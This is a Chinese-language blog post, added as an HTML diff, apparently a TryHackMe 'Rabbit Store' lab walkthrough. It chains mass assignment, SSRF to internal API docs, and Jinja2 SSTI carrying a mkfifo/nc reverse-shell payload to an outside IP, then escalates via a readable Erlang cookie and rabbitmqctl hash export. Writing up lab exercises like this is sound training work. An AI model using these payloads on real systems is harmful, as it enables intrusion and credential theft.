@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>Rabbit Store | T1ng的摆烂日常</title>
+    
+    
+        <meta property="og:site_name" content="T1ng的摆烂日常">
+    
+    
+        <meta property="article:author" content="T1ng">
+    
+    
+        <link rel="icon" href="/img/t1ng.ico">
+    
+    
+<link rel="stylesheet" href="/css/minireset.min.css">
+
+    
+<link rel="stylesheet" href="/css/all.min.css">
+
+    
+<link rel="stylesheet" href="/css/csshake.min.css">
+
+    
+<link rel="stylesheet" href="/css/hljs/lioshi.css">
+
+    
+<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+
+    
+<link rel="stylesheet" href="/styl/main.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/jquery.fancybox.min.js"></script>
+
+    
+<script src="/js/clipboard.min.js"></script>
+
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <header>
+  <div class="outer">
+    <div class="inner">
+      <h1 class="logo-wrap">
+        <a>T1ng的摆烂日常<b><sup></sup></b></a>
+      </h1>
+    </div>
+    <div class="inner">
+      <nav class="main-nav">
+        
+          
+            <a href="/">首页</a>
+          
+        
+          
+            <a href="/archives">归档</a>
+          
+        
+          
+            <a href="/categories">分类</a>
+          
+        
+          
+            <a href="/tags">标签</a>
+          
+        
+          
+            <a href="/friends">友链</a>
+          
+        
+          
+            <div class="dropdown">
+              <a class="dropbtn">相关链接</a>
+              <div class="dropdown-content">
+                
+              </div>
+            </div>
+          
+        
+          
+            <a href="/about">关于</a>
+          
+        
+      </nav>
+    </div>
+  </div>
+</header>
+    <div class="content">
+        <section class="outer">
+    <article>
+        <div class="article-title">
+    <h2>
+        <a href="/2025/02/26/RabbitStore/" class="shake shake-little" title="Rabbit Store">
+            
+            Rabbit Store
+        </a>
+    </h2>
+    <div class="meta_box">
+    
+        
+        
+            
+                
+        
+        <div class="meta meta_auth">
+            <img src="/img/t1ng.png" alt="head" />
+            <p>t1ng</p>
+        </div>
+    
+        
+        
+        <div class="meta meta_date">
+            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+            <p>发布于：2025年02月26日</p>
+        </div>
+    
+        <div class="meta meta_update">
+            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+            <p>更新于：2025年02月26日</p>
+        </div>
+    </div>
+    
+  <div class="post_tags">
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/THM/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>THM</a></li></ul>
+  </div>
+
+
+</div>
+
+        <hr>
+        <div class="article-entry">
+            
+            
+            
+            <h3><span id="任务要求">任务要求</span></h3><p>首先通过利用成批分配漏洞激活账号。利用存在SSRF的api进行访问另一个SSTI攻击目标，实现RCE拿到shell，获得shell后查看Erlang cookie，枚举RabbitMQ发现root密码<br><img src="/2025/02/26/RabbitStore/ccb30768febfc4f7e4b4f5e43c299c82.png"></p>
+<p>nmap扫描收集信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -n -sC -sV -Pn -p- 10.10.100.9</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)</span><br><span class="line">|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://cloudsite.thm/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">4369/tcp  open  epmd    Erlang Port Mapper Daemon</span><br><span class="line">| epmd-info:</span><br><span class="line">|   epmd_port: 4369</span><br><span class="line">|   nodes:</span><br><span class="line">|_    rabbit: 25672</span><br><span class="line">25672/tcp open  unknown</span><br><span class="line">Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>nmap扫描后，80端口被重定向到<a target="_blank" rel="noopener" href="http://cloudsite.thm/%EF%BC%8C%E5%9C%A8hosts%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0">http://cloudsite.thm/，在hosts文件添加</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.100.9 cloudsite.thm</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/d5f051fbe8968cead43fe958605e0574.png"><br>一个关于云服务的静态网站，发现并没有什么可利用，尝试访问登录，发现跳转到storage.cloudsite.thm，使用需要再去添加hosts文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.100.9 cloudsite.thm storage.cloudsite.thm</span><br></pre></td></tr></table></figure>
+
+<p>尝试注册登录账号，发现注册以后尝试登陆，提示账号未激活，尝试登录注册抓包（从中注册成功开始抓包，登录时也抓包）<br><img src="/2025/02/26/RabbitStore/fd958bc667af161da9a2a9a73f962ba6.png"><br>抓包发现api接口可尝试访问<br><img src="/2025/02/26/RabbitStore/9cabbc0a9efb98194878312fe2d2b3dc.png"><br>尝试ffuf进行模糊测试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u &#x27;http://storage.cloudsite.thm/api/FUZZ&#x27; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -mc all -t 100 -ic -fc 404</span><br><span class="line"></span><br><span class="line">uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 112ms]</span><br><span class="line">docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 2542ms]</span><br></pre></td></tr></table></figure>
+
+<p>查看&#x2F;api&#x2F;uploads</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s &#x27;http://storage.cloudsite.thm/api/uploads&#x27;</span><br><span class="line">&#123;&quot;message&quot;:&quot;Token not provided&quot;&#125;   </span><br></pre></td></tr></table></figure>
+
+<p>发现不能提供token，再次抓包尝试<br><img src="/2025/02/26/RabbitStore/f429e1d1cc6c5050a6ea42938ec7c4b4.png"><br>jwt解码，得到格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;header&quot;: &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;payload&quot;: &#123;</span><br><span class="line">    &quot;email&quot;: &quot;1111@1111.com&quot;,</span><br><span class="line">    &quot;subscription&quot;: &quot;inactive&quot;,</span><br><span class="line">    &quot;iat&quot;: 1740497525,</span><br><span class="line">    &quot;exp&quot;: 1740501125</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;signature&quot;: &quot;TmjA-gb3BFkqNKG2Xdq0uEl415GKTizt-87btiAAUkw&quot;,</span><br><span class="line">  &quot;verified&quot;: false,</span><br><span class="line">  &quot;secret&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现subscription的状态为inactive，尝试修改为active，注册界面抓包再次发包<br><img src="/2025/02/26/RabbitStore/18233f6607aaa07ed501249c647f8acb.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /api/register HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: storage.cloudsite.thm</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Referer: http://storage.cloudsite.thm/register.html</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 71</span><br><span class="line"></span><br><span class="line">Origin: http://storage.cloudsite.thm</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjExMTFAMTExMS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NDA0OTkwNTEsImV4cCI6MTc0MDUwMjY1MX0%3d.8kiRVL_RDuvwDpy4KdmHMxFfa4lvZdIsidK9fEvjzwU</span><br><span class="line"></span><br><span class="line">Priority: u=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;email&quot;:&quot;t1ng@t1ng.com&quot;,&quot;password&quot;:&quot;t1ng&quot;,</span><br><span class="line"></span><br><span class="line">&quot;subscription&quot;:&quot;active&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发包以后尝试登录<br><img src="/2025/02/26/RabbitStore/3152b396fe3194cc1b6fe871ec85c97a.png"><br>登陆成功，发现两种上传方法，一种本地文件，另一种url<br>本地服务写入test.txt文件，启动python的web服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/3117f3860596f2ce6e3c248a4d0ec1a1.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</span><br><span class="line">10.10.100.9 - - [25/Feb/2025 11:16:58] &quot;GET /test.txt HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure>
+
+<p>文件重定向到图示目录，利用SSRF漏洞，尝试访问之前无法访问的&#x2F;api&#x2F;docs，但是当强制发出请求时，仍是拒绝访问<br><img src="/2025/02/26/RabbitStore/d5ed67ec5e21e5ac2df0b3fa2ba3f54d.png"><br>发包尝试根据文件位置读到上传的文件内容，继续发包，接下来尝试通过Apache路由（端口3000，为express的默认端口）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /api/store-url HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: storage.cloudsite.thm</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Referer: http://storage.cloudsite.thm/dashboard/active?</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">Origin: http://storage.cloudsite.thm</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InR0dEB0dHQuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQwNTAxODgwLCJleHAiOjE3NDA1MDU0ODB9.Kqx2s88qAU0xJyQY9tfrXLWidhtqwLFPgQXsehewiWA</span><br><span class="line"></span><br><span class="line">Priority: u=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;url&quot;:&quot;http://127.0.0.1:3000/api/docs&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/c1b59a23c8c5fe336ad4328dc4e647ae.png"><br>成功检索了api文档，根据拿到目录再次发包<br><img src="/2025/02/26/RabbitStore/17361de9f51bff69c8dcee30b5c97fdb.png"><br>拿到一堆api查看是否有可用的，其中发现&#x2F;api&#x2F;fetch_messeges_from_chatbot接收了POST请求<br>通过SSTI进行rce<br>使用json的&#x2F;api&#x2F;fetch_messeges_from_chatbot空负载测试，发现需要username参数<br><img src="/2025/02/26/RabbitStore/86707459c1c6b8d45bf4497204bfd934.png"><br>发送username并以admin发送<br><img src="/2025/02/26/RabbitStore/c22a62e99fd6e89b428e7f43cb92afe5.png"><br>提示chatbot正在开发，但是username仍有回显，尝试多语言ssti有效载荷测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;:&quot;$&#123;&#123;&lt;%[%&#x27;\&quot;&#125;&#125;%\\.&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/202eb98a099a79a01208fae97b624f83.png"><br>发现导致Jinja2模板出现错误，所以username存在ssti攻击，并且使用就Jinja2模板引擎，写出反向shell直接rce</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;:&quot;&#123;&#123; self.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.11.115.175 1234 &gt;/tmp/f&#x27;).read() &#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>同时监听端口1234<br><img src="/2025/02/26/RabbitStore/2b0d196a421e05dda77bc52d47f54b7f.png"><br><img src="/2025/02/26/RabbitStore/2e362031d8d038dd67277973dc1f96e8.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/azrael/user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/96a6dec9f4ca9b4ae333f74ceb9c04a8.png"><br>拿到第一题的答案<br>枚举系统文件，发现&#x2F;var&#x2F;lib&#x2F;rabbitmq&#x2F;.erlang.cookie保存的文件是全局可读，读取获得Erlang Cookie<br><img src="/2025/02/26/RabbitStore/0bed752e0aa385949bed3fe8c1ec6c1d.png"><br>在端口扫描中，RabbitMQ在服务器上运行，使用ErlangCookie可以对其继续宁身份验证，默认格式为<code>rabbit@&lt;hostname&gt;</code>，将主机名添加到hosts</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.100.9 cloudsite.thm storage.cloudsite.thm forge</span><br></pre></td></tr></table></figure>
+
+<p>使用rabbitmqctl对发现的Cookie进行枚举</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl --erlang-cookie &#x27;aKQCJe8w9xOgSzl4&#x27; --node rabbit@forge status</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/dabea1da042343793beb5e31ae6d6ab3.png"><br>枚举RabbitMQ用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl --erlang-cookie &#x27;aKQCJe8w9xOgSzl4&#x27; --node rabbit@forge list_users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/dda8f32d8b21045f418452d3c4e7648a.png"><br>发现用户密码是sha-256，检索实例的哈希</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl --erlang-cookie &#x27;aKQCJe8w9xOgSzl4&#x27; --node rabbit@forge export_definitions /tmp/definitions.json</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/1f6363f4d9286218802be138d16be286.png"><br>哈希值采用base64编码，根据文档<code>base64(&lt;4 byte salt&gt; + sha256(&lt;4 byte salt&gt; + &lt;password&gt;))</code><br>为获得hash先将base64转化为十六进制</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF&#x27; | base64 -d | xxd -p -c 100</span><br><span class="line"></span><br><span class="line">e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585</span><br></pre></td></tr></table></figure>
+
+<p>删除开头四字节盐，剩下的为hash值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585</span><br></pre></td></tr></table></figure>
+
+<p>尝试登录root用户<br><img src="/2025/02/26/RabbitStore/a7de0c012cda6ce41020c540854893b8.png"><br>获取root.txt</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/26/RabbitStore/e52ea217342d6283d6abe013dee7a5bc.png"></p>
+<p><img src="/2025/02/26/RabbitStore/2d693150614c649a83fbb9cd00c642d4.png"></p>
+
+            <div class="article-copyright">
+                
+
+            </div>
+        </div>
+    </article>
+    
+
+    <section id="toc-div" >
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">任务要求</span></a></li></ol>
+    </section>
+    <section id="gohome" style="display: none;"><a><i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i></a></section>
+
+
+</section>
+    </div>
+    <footer>
+    <div class="outer">
+        <div class="inner">
+            Powered by <a href="https://github.com/hdxw/hexo-theme-prowiki" target="_blank">ProWiki</a>
+            &copy;2025 t1ng<br>
+            <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"></a>
+            <div style="height: 50px;"></div>
+        </div>
+    </div>
+</footer>
+
+<script src="/js/custom.js"></script>
+
+
+    <script>onload_content();</script>
+
+</body>
+</html>
